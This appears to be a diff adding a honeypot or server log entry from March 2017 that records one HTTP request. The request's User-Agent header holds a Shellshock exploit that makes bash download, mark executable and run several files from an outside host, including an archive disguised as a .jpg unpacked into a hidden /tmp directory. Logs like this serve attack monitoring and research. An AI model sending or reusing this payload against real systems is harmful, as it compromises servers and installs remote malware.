@@ -1,0 +1,9 @@
+---BEGIN---
+	Fri Mar 10 2017 07:58:21 GMT+0000 (UTC)
+	New Connection 212.179.90.226 -> 138.68.229.32
+	User Agent: () { :;}; /bin/bash -c "cd /tmp; wget -O /tmp/p http://loss.at.ua/ffperl.txt; wget -O /tmp/ffak http://loss.at.ua/ffak.txt; wget -O /tmp/ffst http://loss.at.ua/ffst.txt; chmod +x p ffak ffst; ./ffak; ./ffst; cd /tmp; wget -O /tmp/ffperl.jpg http://loss.at.ua/ffperl.jpg; curl -O /tmp/ffperl.jpg http://loss.at.ua/ffperl.jpg; fetch http://loss.at.ua/ffperl.jpg; tar xvf /tmp/ffperl.jpg; rm -rf /tmp/ffperl.jpg; cd /tmp/.usage; chmod +x *; ./ak; ./st; perl p.txt"
+	Requested Resource: /
+	Request Method: GET
+	Accept: undefined
+	Content Type: undefined
+	Content Length: undefined
